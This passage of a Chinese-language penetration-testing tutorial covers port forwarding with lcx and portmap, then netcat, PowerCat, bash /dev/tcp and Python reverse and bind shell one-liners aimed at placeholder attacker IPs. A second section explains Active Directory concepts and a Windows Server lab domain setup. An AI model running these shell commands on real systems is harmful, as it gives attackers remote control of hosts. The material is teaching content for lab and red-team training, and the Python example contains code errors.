<li>攻击机 VPS：<a href="http://xxx.xxx.xxx.xxx" target="_blank" rel="noopener noreferrer">xxx.xxx.xxx.xxx<ExternalLinkIcon/></a></li>
</ul>
</li>
<li>
<p>场景复现</p>
<ol>
<li>在靶机上将 <code v-pre>3389</code> 端口转发到攻击机 VPS 的 <code v-pre>53</code> 端口
<code v-pre>lcx -slave xxx.xxx.xxx.xxx 53 127.0.0.0 3389</code></li>
<li>在 VPS 上监听 <code v-pre>53</code> 端口并转发到 <code v-pre>1111</code> 端口
<code v-pre>./portmap -m 2 p1 53 -p2 1111</code></li>
<li>在攻击机上连接 <code v-pre>xxx.xxx.xxx.xxx:1111</code></li>
</ol>
</li>
</ul>
<h3 id="反弹-shell-1" tabindex="-1"><a class="header-anchor" href="#反弹-shell-1" aria-hidden="true">#</a> 反弹 Shell</h3>
<blockquote>
<p>PS：断开连接时，建议先断开连接端</p>
</blockquote>
<h4 id="netcat-反弹-shell" tabindex="-1"><a class="header-anchor" href="#netcat-反弹-shell" aria-hidden="true">#</a> Netcat 反弹 Shell</h4>
<blockquote>
<p>NetCat，简称 NC。是一个简单、可靠的网络工具，被誉为网络界的瑞士军刀。通过 NC 可以进行端口扫描、反弹 Shell、端口监听和文件传输等操作。</p>
</blockquote>
<p>NC 的常用参数：</p>
<ul>
<li><code v-pre>-c</code>：指定连接后要执行的 Shell 命令</li>
<li><code v-pre>-e</code>：指定连接后要执行的文件名</li>
<li><code v-pre>-k</code>：配置 Socket 一直存活（如不想在 Shell 后使监听断开可以配置此参数）</li>
<li><code v-pre>-l</code>：监听模式</li>
<li><code v-pre>-p</code>：设置本地主机使用的通信端口</li>
<li><code v-pre>-u</code>：使用 UDP 传输协议。默认 TCP</li>
<li><code v-pre>-v</code>：显示指令执行过程。用 <code v-pre>-vv</code> 会更详细</li>
</ul>
<h5 id="正向-shell-两台机器互通" tabindex="-1"><a class="header-anchor" href="#正向-shell-两台机器互通" aria-hidden="true">#</a> 正向 Shell（两台机器互通）</h5>
<ul>
<li>Windows
靶机开启监听： <code v-pre>nc.exe -lvvp 3333 -e C:\Windows\System32\cmd.exe</code>
攻击进行连接： <code v-pre>nc.exe 192.168.xxx.xxx 3333</code></li>
<li>Linux
靶机开启监听： <code v-pre>nc -lvvp 3333 -e /bin/bash</code>
攻击进行连接： <code v-pre>nc.exe 192.168.xxx.xxx 3333</code></li>
</ul>
<h5 id="反弹-shell-靶机可以访问攻击机-攻击机无法直接访问靶机" tabindex="-1"><a class="header-anchor" href="#反弹-shell-靶机可以访问攻击机-攻击机无法直接访问靶机" aria-hidden="true">#</a> 反弹 Shell（靶机可以访问攻击机，攻击机无法直接访问靶机）</h5>
<ul>
<li>Windows
攻击开启监听： <code v-pre>nc.exe -lvvp 3333</code>
靶机进行连接： <code v-pre>nc.exe -e C:\Windows\System32\cmd.exe 192.168.xxx.xxx 3333</code></li>
<li>Linux
攻击开启监听： <code v-pre>nc -lvvp 3333</code>
靶机进行连接： <code v-pre>nc -e /bin/bash 192.168.xxx.xxx 3333</code></li>
</ul>
<h5 id="nc-的其他用法" tabindex="-1"><a class="header-anchor" href="#nc-的其他用法" aria-hidden="true">#</a> NC 的其他用法</h5>
<ol>
<li>Banner 抓取</li>
</ol>
<p><code v-pre>nc -nv IP Port</code></p>
<ol start="2">
<li>端口探测</li>
</ol>
<p><code v-pre>nc -v IP Port</code>
<code v-pre>nc -v -z IP 1~65535</code></p>
<ol start="3">
<li>端口监听</li>
</ol>
<p><code v-pre>nc -l -p Port</code></p>
<ol start="4">
<li>文件传输</li>
</ol>
<p>接收端： <code v-pre>nc -lp Port &gt; file</code>
发送端： <code v-pre>nc -vn IP Port &lt; file -q 1</code>（Linux） 或 <code v-pre>nc -vn IP Port &lt; file -w</code> （Windows）</p>
<ol start="5">
<li>简易通信</li>
</ol>
<p>VPS：<code v-pre>nc -l p Port</code>
靶机：<code v-pre>nc -vn IP Port</code></p>
<ol start="6">
<li>连接远程主机</li>
</ol>
<p><code v-pre>nc -nvv IP Port</code></p>
<h4 id="powercat-反弹-shell" tabindex="-1"><a class="header-anchor" href="#powercat-反弹-shell" aria-hidden="true">#</a> PowerCat 反弹 Shell</h4>
<blockquote>
<p><code v-pre>PowerCat</code> 是一个 <code v-pre>powershell</code> 写的 <code v-pre>TCP/IP</code> 工具，可以看成 <code v-pre>netcat</code> 的 <code v-pre>powershell</code> 实现，并且在里面加入和众多其他功能，如： 文件上传、 <code v-pre>smb</code> 协议支持、中继模式，生成 <code v-pre>payload</code>、端口扫描等</p>
</blockquote>
<h5 id="powercat-安装" tabindex="-1"><a class="header-anchor" href="#powercat-安装" aria-hidden="true">#</a> PowerCat 安装</h5>
<ol>
<li>下载</li>
</ol>
<blockquote>
<p><code v-pre>https://github.com/besimorhino/powercat</code></p>
</blockquote>
<ol start="2">
<li>导入（<code v-pre>shift</code> + 鼠标右键，打开 <code v-pre>powershell</code>）</li>
</ol>
<blockquote>
<p><code v-pre>Import-Module .\powercat.ps1</code></p>
</blockquote>
<ol start="3">
<li>如果提示“未能加载指定模块”，可能是权限问题</li>
</ol>
<blockquote>
<p><code v-pre>Set-ExecutionPolicy Unrestricted</code></p>
</blockquote>
<ol start="4">
<li>使用</li>
</ol>
<blockquote>
<p><code v-pre>powercat -h</code></p>
</blockquote>
<h5 id="nc-和-powercat-的正向连接" tabindex="-1"><a class="header-anchor" href="#nc-和-powercat-的正向连接" aria-hidden="true">#</a> Nc 和 PowerCat 的正向连接</h5>
<ol>
<li>靶机使用 <code v-pre>powercat</code> 开启监听</li>
</ol>
<blockquote>
<p><code v-pre>powercat -l -p 8080 -e cmd.exe -v</code></p>
</blockquote>
<ol start="2">
<li>攻击机使用 <code v-pre>nc</code> 连接</li>
</ol>
<blockquote>
<p><code v-pre>nc 192.168.xxx.xxx 8080 -vv</code></p>
</blockquote>
<h5 id="nc-和-powercat-的反向连接" tabindex="-1"><a class="header-anchor" href="#nc-和-powercat-的反向连接" aria-hidden="true">#</a> Nc 和 PowerCat 的反向连接</h5>
<ol>
<li>攻击机使用 <code v-pre>nc</code> 开启监听</li>
</ol>
<blockquote>
<p><code v-pre>nc -l -p 8888 -vv</code></p>
</blockquote>
<ol start="2">
<li>靶机使用 <code v-pre>powercat</code> 连接</li>
</ol>
<blockquote>
<p><code v-pre>powercat -c 192.168.xxx.xxx -p 8080 -v -e cmd.exe</code></p>
</blockquote>
<h5 id="powercat-和-powercat-的正向连接" tabindex="-1"><a class="header-anchor" href="#powercat-和-powercat-的正向连接" aria-hidden="true">#</a> PowerCat 和 PowerCat 的正向连接</h5>
<ol>
<li>
<p>靶机使用 <code v-pre>powercat</code> 开启监听</p>
</li>
<li>
<p>攻击机使用 <code v-pre>powercat</code> 连接</p>
</li>
</ol>
<h5 id="powercat-和-powercat-的反向连接" tabindex="-1"><a class="header-anchor" href="#powercat-和-powercat-的反向连接" aria-hidden="true">#</a> PowerCat 和 PowerCat 的反向连接</h5>
<ol>
<li>攻击机使用 <code v-pre>powercat</code> 开启监听</li>
</ol>
<blockquote>
<p><code v-pre>powercat -l -p 8080 -v</code></p>
</blockquote>
<ol start="2">
<li>靶机使用 <code v-pre>powercat</code> 连接</li>
</ol>
<blockquote>
<p><code v-pre>powercat -c 192.168.xxx.xxx -p 8080 -v -ep</code></p>
</blockquote>
<h5 id="powercat-的其他用法" tabindex="-1"><a class="header-anchor" href="#powercat-的其他用法" aria-hidden="true">#</a> PowerCat 的其他用法</h5>
<ol>
<li>使用 PowerCat 进行文件传输</li>
</ol>
<blockquote>
<p>靶机监听 <code v-pre>9999</code> 端口，接收一个名为 <code v-pre>test.txt</code> 的文件
<code v-pre>powercat -l -p 9999 -of test.txt -v</code></p>
<p>攻击机连接靶机 <code v-pre>9999</code> 端口并发送 <code v-pre>D:\test.txt</code> 文件
<code v-pre>powercat -c 192.168.xxx.xxx -p 9999 -i D:\test.txt -v</code></p>
</blockquote>
<ol start="2">
<li>使用 PowerCat 生成 <code v-pre>payload</code></li>
</ol>
<blockquote>
<p>攻击机生成名为 <code v-pre>shell.ps1</code> 的 <code v-pre>payload</code>（生成后需要将 <code v-pre>payload</code> 脚本上传至靶机）
<code v-pre>powercat -l -p 8888 -e cmd -v -g &gt;&gt; shell.ps1</code></p>
<p>攻击机连接
<code v-pre>powercat -c 192.168.xxx.xxx -p 8888 -v</code></p>
<p>靶机上运行脚本
<code v-pre>.\shell.ps1</code></p>
</blockquote>
<h4 id="bash-反弹-shell" tabindex="-1"><a class="header-anchor" href="#bash-反弹-shell" aria-hidden="true">#</a> Bash 反弹 Shell</h4>
<h5 id="bash-介绍" tabindex="-1"><a class="header-anchor" href="#bash-介绍" aria-hidden="true">#</a> Bash 介绍</h5>
<p><code v-pre>shell</code> 也称之为<strong>终端</strong>或者<strong>壳</strong>，是用户与系统内核之间交互的翻译官，而 <code v-pre>bash</code> 则是 <code v-pre>linux</code> 中默认使用的 <code v-pre>shell</code>。</p>
<h5 id="bash-反弹-shell-命令" tabindex="-1"><a class="header-anchor" href="#bash-反弹-shell-命令" aria-hidden="true">#</a> Bash 反弹 Shell 命令</h5>
<blockquote>
<p><code v-pre>bash -i &gt;&amp;/dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</code> （对应的监听时，要使用 <code v-pre>tcp</code>，如： <code v-pre>nc -lvvp 999</code>）
<code v-pre>bash -i &gt;&amp;/dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;2</code>
<code v-pre>bash -i &gt;&amp;/dev/udp/攻击机IP/攻击机端口 0&gt;&amp;1</code> （对应的监听时，要使用 <code v-pre>udp</code>，如： <code v-pre>nc -lup 999</code>）
<code v-pre>bash -i &gt;&amp;/dev/udp/攻击机IP/攻击机端口 0&gt;&amp;2</code></p>
</blockquote>
<ul>
<li>
<p><code v-pre>bash -i</code>： 打开交互式 <code v-pre>shell</code></p>
</li>
<li>
<p><code v-pre>&amp;</code>： 符号用于区分文件和文件描述符</p>
</li>
<li>
<p><code v-pre>&gt;&amp;</code>： 符号后面跟文件时，表示将标准输出和标准错误输出重定向至文件</p>
</li>
<li>
<p><code v-pre>&gt;&amp;</code>： 符号后面跟数字时，表示后面的数字是文件描述符。 如果不加 <code v-pre>&amp;</code> 符号，后面的数字会被当做文件。</p>
</li>
<li>
<p><code v-pre>0</code>： <code v-pre>Linux</code> 下的文件描述符。代表标准输入重定向。</p>
</li>
<li>
<p><code v-pre>1</code>： <code v-pre>Linux</code> 下的文件描述符。代表标准输出重定向。</p>
</li>
<li>
<p><code v-pre>2</code>： <code v-pre>Linux</code> 下的文件描述符。代表错误输出重定向。</p>
</li>
<li>
<p><code v-pre>/dev/tcp</code>： 是 <code v-pre>Linux</code> 下的特殊设备，可用于建立 <code v-pre>Socket</code> 连接，读写这两个文件相当于在 <code v-pre>Socket</code> 连接中传输数据。</p>
</li>
<li>
<p><code v-pre>/dev/udp</code>： 同上</p>
</li>
<li>
<p><code v-pre>&gt;&amp;/dev/tcp/IP/PORT</code>： 表示将标准输出和标准错误重定向到 <code v-pre>/dev/tcp/IP/PORT</code> 文件下，也就是重定向到攻击机指定端口。此时攻击机就可以看到靶机的命令执行结果。</p>
</li>
<li>
<p><code v-pre>0&gt;&amp;1</code> 或 <code v-pre>0&gt;&amp;2</code>： 将标准输入重定向到标准输出。 结合上面标准输出重定向到了攻击机，最终的结果就是标准输入重定向到了攻击机。两条命令组合从而可以通过攻击机输入命令，并且可以看到执行结果输出</p>
</li>
</ul>
<h4 id="python-反弹-shell" tabindex="-1"><a class="header-anchor" href="#python-反弹-shell" aria-hidden="true">#</a> Python 反弹 Shell</h4>
<div class="language-python line-numbers-mode" data-ext="py"><pre v-pre class="language-python"><code><span class="token keyword">import</span> socket<span class="token punctuation">,</span> subprocess<span class="token punctuation">,</span> os<span class="token punctuation">;</span>

s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connection<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.xx.xx'</span><span class="token punctuation">,</span> <span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span> <span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>整理一下，用 <code v-pre>python -c</code> 执行时，整个 <code v-pre>python</code> 代码需要放在引号中，每行用分号隔开，注意引号的转义或用单双引号区分开</p>
<p><code v-pre>python -c &quot;import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connection(('192.168.xx.xx', 8080));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1)；os.dup2(s.fileno(), 2)；p = subprocess.call(['/bin/bash', '-i'])&quot;</code></p>
<h2 id="域环境" tabindex="-1"><a class="header-anchor" href="#域环境" aria-hidden="true">#</a> 域环境</h2>
<h3 id="内网介绍" tabindex="-1"><a class="header-anchor" href="#内网介绍" aria-hidden="true">#</a> 内网介绍</h3>
<blockquote>
<p>内网也称之为局域网，是指在某一个区域内由多态计算机互连而成的计算机组。</p>
<p>在局域网中，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等。</p>
<p>内网是封闭的，可以由办公室内的两台计算机组成，也可以由一个公司内的大量计算机组成。</p>
</blockquote>
<h4 id="工作组介绍" tabindex="-1"><a class="header-anchor" href="#工作组介绍" aria-hidden="true">#</a> 工作组介绍</h4>
<h5 id="工作组的概念" tabindex="-1"><a class="header-anchor" href="#工作组的概念" aria-hidden="true">#</a> 工作组的概念</h5>
<blockquote>
<p>在一个大型单位，可能会有成百上千台计算机互相连接组成局域网，如果不对其进行分组，那是相当混乱的。</p>
<p>工作组（<code v-pre>Work Group</code>）就是为了解决这一问题。将不同的计算机按功能（或部门，或其他分类）分别列入不同的工作组</p>
</blockquote>
<h5 id="如何创建工作组合加入工作组" tabindex="-1"><a class="header-anchor" href="#如何创建工作组合加入工作组" aria-hidden="true">#</a> 如何创建工作组合加入工作组</h5>
<p>加入工作组：右键【计算机】， 选择【属性】，【更改设置】（<code v-pre>Win10</code> 选择【高级系统设置】），【更改】，在【计算机名】处输入计算机名称，在【工作组】处输出要加入的工作组名称，重启电脑，进入【网络】就可以看到同一个工作组的成员了</p>
<h4 id="域介绍" tabindex="-1"><a class="header-anchor" href="#域介绍" aria-hidden="true">#</a> 域介绍</h4>
<blockquote>
<p><code v-pre>Windows</code> 域是计算机网络的一种形式，其中所有用户计算机、打印机和其他安全主体都在位于称为<strong>域控制器</strong>的一个或多个中央计算机集群上的中央数据库中注册。</p>
<p>身份验证在域控制器上进行。</p>
<p>在域中使用计算机的每个人都会收到一个唯一的用户账户，然后可以为该账户分配对该域内资源的访问权限。</p>
<p>**域（<code v-pre>Domain</code>）**是一个有安全边界的计算机集合（安全边界的意思是，如果在两个域中，域<code v-pre>A</code>中的用户无法访问域<code v-pre>B</code>中的资源），可以把域理解成升级版的工作组，与工作组相比，域的安全管理控制机制更加严格。用户想要访问域内的资源，必须以合法的身份登录域，而用户对域内的资源拥有什么样的权限，还取决于用户在域内的身份。</p>
</blockquote>
<h5 id="单域" tabindex="-1"><a class="header-anchor" href="#单域" aria-hidden="true">#</a> 单域</h5>
<blockquote>
<p>通常在一个地理位置固定的大公司里，建立一个域就可以满足需求。在一个域内，一般要至少两台域服务器，一台作为 <code v-pre>DC</code>，另一台作为备份 <code v-pre>DC</code>。</p>
<p>活动目录的数据库（包括用户的账号信息）时存储在 <code v-pre>DC</code> 中的，如果没有备份 <code v-pre>DC</code>，一旦 <code v-pre>DC</code> 瘫痪了，域内的其他用户就不能登录该域了。</p>
</blockquote>
<h5 id="父域和子域" tabindex="-1"><a class="header-anchor" href="#父域和子域" aria-hidden="true">#</a> 父域和子域</h5>
<blockquote>
<p>出于管理及其他需求，需要在网络中划分多个域。第一个域称为<strong>父域</strong>，各分部的域称为该域的<strong>子域</strong>。</p>
</blockquote>
<h5 id="域树" tabindex="-1"><a class="header-anchor" href="#域树" aria-hidden="true">#</a> 域树</h5>
<blockquote>
<p><strong>域树</strong>是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域，不能访问或者管理其他域。如果两个域之间需要互相访问，则需要建立信任关系。</p>
<p>域树内的父域与子域，不但可以按照需要相互管理，还可以跨网络分配文件和打印机等设备及资源，从而在不同的域之间实现网络资源的共享和管理、通信及数据传输。</p>
</blockquote>
<h5 id="域森林" tabindex="-1"><a class="header-anchor" href="#域森林" aria-hidden="true">#</a> 域森林</h5>
<blockquote>
<p><strong>域森林</strong> 是指多个域树通过建立信任关系组成的集合。</p>
</blockquote>
<h5 id="域名服务器-domain-name-server" tabindex="-1"><a class="header-anchor" href="#域名服务器-domain-name-server" aria-hidden="true">#</a> 域名服务器（Domain Name Server）</h5>
<blockquote>
<p><strong>域名服务器</strong> 是指用于实现域名和与之相对的IP地址转换的服务器。从对域树的介绍中可以看出，域树中的域名和DNS域名非常相似。</p>
<p>而实际上，因为域中的计算机是使用DNS来定位域控制器、服务器及其他计算机、网络服务的。所以域的名字就是DNS域的名字。</p>
<p>在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的（DNS服务器和域控制器通常配置在同一机器上）</p>
</blockquote>
<h4 id="活动目录" tabindex="-1"><a class="header-anchor" href="#活动目录" aria-hidden="true">#</a> 活动目录</h4>
<blockquote>
<p><strong>活动目录（Active Directory， AD）是指域环境中提供目录服务的组件</strong>。</p>
<p>目录中存储有关网络对象（用户、组、计算机、共享资源、打印机、联系人等）的信息。</p>
<p>目录服务是指帮助用户快速、准确的从目录中找到其所需信息的服务。</p>
<p>活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制。</p>
<p><strong>活动目录主要提供以下功能：</strong></p>
<ul>
<li>账号集中管理： 所有账号均存储在服务器中，以便执行命令和重置密码</li>
<li>软件集中管理： 统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择需要安装的软件</li>
<li>环境集中管理： 统一客户端桌面、IE、TCPP 协议等设置。增强安全性，统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络，对资源进行统一管理</li>
<li>稳定可靠性： 更可靠、更短的宕机时间。例如： 利用活动目录控制用户访问权限，利用集群、负载均衡等技术对文件服务器进行容灾设置等。</li>
</ul>
</blockquote>
<h4 id="安全域划分" tabindex="-1"><a class="header-anchor" href="#安全域划分" aria-hidden="true">#</a> 安全域划分</h4>
<blockquote>
<p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段。</p>
<p>这个网段内的计算机拥 有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略 (NACL)，从而对允许哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。</p>
<p>这些措施将使得网络风险最小化，当攻击发生时,可以尽可能地将威胁隔离，从而降低对域内计算机的影响。</p>
</blockquote>
<blockquote>
<p>在一个用路由器连接的内网中，可以将网络划分为三个区域：安全级别最高的内网；安全级别中等的DMZ；安全级别最低的外网（Internet）。这三个区域负责完成不同的任务，因此需要设置不同的访问策略。</p>
<p>DMZ称为隔离区，是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统与安全系统之间的缓冲区。</p>
<p>DMZ位于企业内部网络和外部网络之间。可以在DMZ 中放置一些必须公开的服务器设施，例如企业Web服务器、FTP服务器和论坛服务器等。</p>
<p>DMZ是对外提供服务的区域，因此可以从外部访问。</p>
<p>在网络边界上一般会部署防火墙及入侵检测、入侵防御产品等。如果有Web应用，还会设置 WAF，从而更加有效地保护内网。攻击者如果要进入内网，首先要突破的就是这重重防御。</p>
</blockquote>
<blockquote>
<p>配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略以实现其屏障功能：</p>
<ul>
<li>
<p><strong>内网可以访问外网：</strong> 内网用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</p>
</li>
<li>
<p><strong>内网可以访问DMZ：</strong> 此策略使内网用户可以使用或者管理DMZ中的服务器。</p>
</li>
<li>
<p><strong>外网不能访问内网：</strong> 这是防火墙的基本策略。如果要访问，就要通过 PN 的方式来进行</p>
</li>
<li>
<p><strong>外网可以访问DMZ：</strong> 因为DMZ中的服务器需要为外界提供服务，所以外网必须可以访问 DMZ。同时，需要由防火墙来完成从对</p>
<p>外地址到服务器实际地址的转换。</p>
</li>
<li>
<p><strong>DMZ不能访问内网：</strong> 如果不执行此策略，当攻击者攻陷DMZ时，内网将无法受到保护</p>
</li>
<li>
<p><strong>DMZ不能访问外网：</strong> 此策略也有例外。例如，在DMZ中放置了邮件服务器，就要允许访问外网，否则邮件服务器无法正常工</p>
<p>作。</p>
</li>
</ul>
</blockquote>
<blockquote>
<p><strong>内网又可以分为办公区和核心区：</strong></p>
<p>办公区：公司员工日常的工作区，一般会安装防病毒软件、主机入侵检测产品等。办公区一般能够访问DMZ。如果运维人员也在办公区，那么部分主机也能访问核心数据区(很多企业还会使用堡垒机来统一管理用户的登录行为)攻击者。如果想进入内网，一般会使用鱼叉攻击、水坑攻击，当然还有社会工程学手段。办公区人员多而杂，变动也很频繁，在安全管理上可能存在诸多漏洞，是攻击者进人内网的重要途径之一。</p>
<p><strong>核心区</strong>：存储企业最重要的数据、文档等信息资产,通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少的主机能够访问。从外部是绝难直接访问核心区的。</p>
<p>一般来说，能够直接访问核心区的只有运维人员或者IT部门的主管，所以，攻击者会重点关注这些用户的信息(攻击者在内网中进行横向移动攻击时，会优先查找这些主机）</p>
</blockquote>
<h4 id="域中计算机的分类" tabindex="-1"><a class="header-anchor" href="#域中计算机的分类" aria-hidden="true">#</a> 域中计算机的分类</h4>
<blockquote>
<p>域中计算机的分类在域结构的网络中，计算机的身份是不平等的,有域控制器、成员服务器、客户机、独立服务器四种类型。</p>
<ul>
<li>
<p><strong>域控制器：</strong></p>
<p>域控制器用于管理所有的网络访问，包括登录服务器、访问共享目录和资源。域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息。</p>
<p>在网络中，可以有多台计算机被配置为域控制器，以分批用户的登录、访问等操作。多个域控制器可以一起工作，自动备份用户账户和活动目录数据。这样，即使部分域控制器痪，网络访问也不会受到影响，提高了网络的安全性和稳定性。</p>
</li>
<li>
<p><strong>成员服务器：</strong></p>
<p>成员服务器是指安装了服务器操作系统并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源。</p>
<p>成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等</p>
</li>
<li>
<p><strong>客户机：</strong></p>
<p>域中的计算机可以是安装了其他操作系统的计算机，用户利用这些计算机和域中的账户就可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后，即可访间网络中的各种资源。</p>
</li>
<li>
<p><strong>独立服务器：</strong></p>
<p>独立服务器和域没有关系。如果服务器既不加入域，也不安装活动目录，就称其为独立服务器。</p>
<p>独立服务器可以创建工作组、与网络屮的其他计算机共享资源，但不能使用活动目录提供的任何服务，</p>
</li>
</ul>
<p><strong>域控制器用于存放活动目录数据库，是域中必须要有的，而其他三种计算机则不是必须要有的，也就是说，最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。当然，域中各服务器的角色是可以改变的。例如：独立服务器既可以成为域控制器，也可以加入某个域成为成员服务器</strong>。</p>
</blockquote>
<h3 id="域环境搭建" tabindex="-1"><a class="header-anchor" href="#域环境搭建" aria-hidden="true">#</a> 域环境搭建</h3>
<table>
<thead>
<tr>
<th>机器名称</th>
<th>机器IP</th>
</tr>
</thead>
<tbody>
<tr>
<td>WindowsServer 2012 R2（域控）</td>
<td>192.168.136.10</td>
</tr>
<tr>
<td>WindowsServer 2008 R2（域内主机）</td>
<td>192.168.136.20</td>
</tr>
<tr>
<td>WindowsServer 2008 R2（域内主机）</td>
<td>192.168.136.30</td>
</tr>
</tbody>
</table>
<h4 id="搭建域控环境" tabindex="-1"><a class="header-anchor" href="#搭建域控环境" aria-hidden="true">#</a> 搭建域控环境</h4>
<blockquote>
<p>我这里虚拟机是 Net 方式联网</p>
</blockquote>
<h5 id="一、配置服务器网络" tabindex="-1"><a class="header-anchor" href="#一、配置服务器网络" aria-hidden="true">#</a> 一、配置服务器网络</h5>
<blockquote>
<ul>
<li>静态IP地址：192.168.136.10</li>
<li>子网掩码：255.255.255.0</li>
<li>网关： 192.168.136.2 （默认网关）</li>
<li>DNS： 192.168.136.10（指向本机）</li>
</ul>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_01.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<h5 id="二、更改计算机名" tabindex="-1"><a class="header-anchor" href="#二、更改计算机名" aria-hidden="true">#</a> 二、更改计算机名</h5>
<blockquote>
<p>以 <code v-pre>DC</code> 为例，修改完成后需要重启</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_02_更改计算机名.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<h5 id="三、安装域控制器和-dns" tabindex="-1"><a class="header-anchor" href="#三、安装域控制器和-dns" aria-hidden="true">#</a> 三、安装域控制器和 DNS</h5>
<blockquote>
<p>打开【服务器管理仪表盘】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_03_安装域控制器和DNS服务.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>点击【添加角色和功能】，下一步，【基于角色或基于功能的安装】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_03_安装域控制器和DNS服务_02.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>从服务器池中选择服务器，选中【DC】，下一步</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_03_安装域控制器和DNS服务_03.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>勾选【Active Directory 域服务】和【DNS 服务器】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/domain/域控主机配置_03_安装域控制器和DNS服务_04.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>【功能】、【AD DS】、【DNS 服务器】都保持默认配置，直接【下一步】，最后点击【安装】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_03_安装域控制器和DNS服务_05.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>安装完成后，先不要关闭窗口</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_03_安装域控制器和DNS服务_06.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<h5 id="四、升级服务器" tabindex="-1"><a class="header-anchor" href="#四、升级服务器" aria-hidden="true">#</a> 四、升级服务器</h5>
<blockquote>
<p>上一步最后安装完成后，点击中间蓝色字体【将此服务器提升为域控制器】</p>
<p>如果不小心关闭了，在【仪表盘】右上角【黄色感叹号】中还可以看到</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_01.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>【在部署配置】选项中，选择【添加新林】，指定一个根域名（必须使用和<code v-pre>DNS</code> 命名约定的根域名，以 <code v-pre>hack.com</code> 为例）</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_02.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>在【域控制器选项】中，【林功能级别】设置为：<code v-pre>Windows Server 2012 R2</code>，【域功能级别】设置为： <code v-pre>Windows Server 2012 R2</code>。（在默认情况下，应该选择 <code v-pre>DNS</code> 服务器，林中的第一个域控制器必须是全局目录服务器而且不能是只读域控制器（<code v-pre>RODC</code>））。</p>
<p>在【键入目录服务还原模式（<code v-pre>DSRM</code>）密码】处输入密码（这个密码是用来还原目录服务的，这里以 <code v-pre>123abc!@#</code> 为例）</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_03.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>在【DNS选项】中，忽略“无法创建 DNS 服务器的委派”警告，保持默认配置，点击【下一步】</p>
</blockquote>
<blockquote>
